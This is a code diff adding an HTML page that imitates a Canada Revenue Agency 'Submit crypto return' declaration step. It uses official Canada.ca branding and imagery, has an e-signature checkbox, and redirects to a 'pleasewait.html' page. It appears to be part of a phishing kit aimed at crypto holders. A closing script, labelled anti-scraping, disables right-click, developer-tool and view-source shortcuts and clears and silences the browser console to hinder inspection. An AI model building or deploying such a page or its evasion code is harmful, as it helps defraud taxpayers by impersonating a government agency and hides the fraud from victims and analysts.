@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Submit crypto return - Step 3 - Canada.ca</title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico?v=2">
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&family=Lato:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Noto Sans', sans-serif; color: #333; }
+        .container-custom { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
+        .nav-bar { background-color: #26374a; height: 50px; }
+        .nav-bar a { text-decoration: none; cursor: pointer; }
+        .nav-bar a:hover { background-color: #1a2633; }
+        .red-accent { border-bottom: 4px solid #af3c43; display: inline-block; margin-bottom: 20px; }
+        .search-container { display: flex; align-items: center; }
+        .search-input { border: 1px solid #ccc; padding: 6px 10px; width: 250px; }
+        .search-button { background-color: #26374a; color: white; padding: 6px 12px; border: 1px solid #26374a; }
+        input:focus, select:focus { outline: 2px solid #335075; outline-offset: 1px; }
+    </style>
+</head>
+<body class="bg-white">
+
+    <header class="py-6">
+        <div class="container-custom flex justify-between items-start">
+            <img src="https://www.canada.ca/etc/designs/canada/wet-boew/assets/sig-blk-en.svg" alt="Government of Canada" class="h-10">
+            <div class="hidden md:flex flex-col items-end">
+                <a href="certification-fr.html" class="text-[#335075] hover:underline text-sm font-semibold underline mb-4">Français</a>
+                <div class="search-container">
+                    <input type="text" placeholder="Search CRA" class="search-input">
+                    <button class="search-button"><i class="fas fa-search"></i></button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+  <nav class="nav-bar"></nav>
+
+
+    <div class="bg-white py-3 border-b border-gray-100">
+        <div class="container-custom text-sm">
+            <nav class="flex items-center text-[#335075]">
+                <a href="#" class="hover:underline">Canada.ca</a>
+                <i class="fas fa-chevron-right text-[10px] mx-3 text-gray-400"></i>
+                <a href="#" class="hover:underline">CRA</a>
+                <i class="fas fa-chevron-right text-[10px] mx-3 text-gray-400"></i>
+                <span>Submit crypto return</span>
+            </nav>
+        </div>
+    </div>
+
+    <main class="container-custom py-10">
+        <div class="red-accent">
+            <h1 class="text-4xl font-bold pb-2">Submit crypto return</h1>
+        </div>
+
+        <div class="mb-8">
+            <p class="text-xl font-bold text-[#333]">Step 3 of 4: Declaration and agreement</p>
+            <div class="w-full bg-gray-200 h-2 mt-4 max-w-md">
+                <div class="bg-[#335075] h-2 w-3/4"></div>
+            </div>
+        </div>
+
+        <form id="certificationForm" class="max-w-4xl space-y-8">
+            <section class="space-y-4">
+                <h2 class="text-2xl font-bold border-b pb-2">Taxpayer Declaration</h2>
+                <div class="space-y-4 text-gray-700 leading-relaxed">
+                    <p>I declare that the information provided in this crypto-asset return is complete and accurate to the best of my knowledge. I acknowledge that all crypto disposals, income events, and taxable benefits have been reported in accordance with the Income Tax Act and CRA guidance.</p>
+                    <p>I understand that penalties may apply for false statements, omissions, or failure to disclose relevant transactions. I confirm that I have maintained adequate books and records, including wallet addresses, exchange statements, and transaction histories, and will provide documentation upon request.</p>
+                    <p>I certify that the values reported reflect fair market value in Canadian dollars at the time of each transaction and that any applicable GST/HST considerations have been reviewed and included where required.</p>
+                </div>
+            </section>
+
+            <section class="space-y-4">
+                <h2 class="text-2xl font-bold border-b pb-2">Agreement</h2>
+                <div class="bg-gray-50 border border-gray-200 rounded p-4">
+                    <label class="flex items-start gap-3 text-gray-800">
+                        <input type="checkbox" class="mt-1" required>
+                        <span>I agree that this return is true, complete, and correct, and I understand that submitting this form constitutes my electronic signature for the crypto return filing.</span>
+                    </label>
+                </div>
+            </section>
+
+            <div class="flex gap-4 pt-6">
+                <button type="submit" class="bg-[#335075] text-white px-8 py-2 rounded font-bold hover:bg-[#26374a]">Next</button>
+                <button type="button" onclick="window.location.href='declaration.html'" class="bg-gray-200 text-gray-700 px-8 py-2 rounded font-bold hover:bg-gray-300">Previous</button>
+            </div>
+        </form>
+
+        <div class="mt-20 border-t pt-10 text-gray-600 text-sm">
+            <p>Date modified: 2023-12-13</p>
+        </div>
+    </main>
+
+    <footer class="bg-[#26374a] text-white py-16 border-t-8 border-[#af3c43]">
+        <div class="container-custom">
+            <h2 class="text-2xl font-bold">Canada Revenue Agency (CRA)</h2>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('certificationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            window.location.href = 'pleasewait.html';
+        });
+    </script>
+
+    <script>
+        // Anti-scraping protection
+        (function() {
+            // Disable right-click
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
+            document.addEventListener('keydown', function(e) {
+                if (e.keyCode == 123 || // F12
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 73) || // Ctrl+Shift+I
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 74) || // Ctrl+Shift+J
+                    (e.ctrlKey && e.keyCode == 85) || // Ctrl+U
+                    (e.ctrlKey && e.keyCode == 83)) { // Ctrl+S
+                    e.preventDefault();
+                    return false;
+                }
+            });
+
+            // Clear console logs periodically
+            setInterval(function() {
+                console.clear();
+            }, 1000);
+
+            // Disable console functions
+            console.log = function() {};
+            console.warn = function() {};
+            console.error = function() {};
+            console.info = function() {};
+            console.debug = function() {};
+        })();
+    </script>
+
+</body>
+</html>
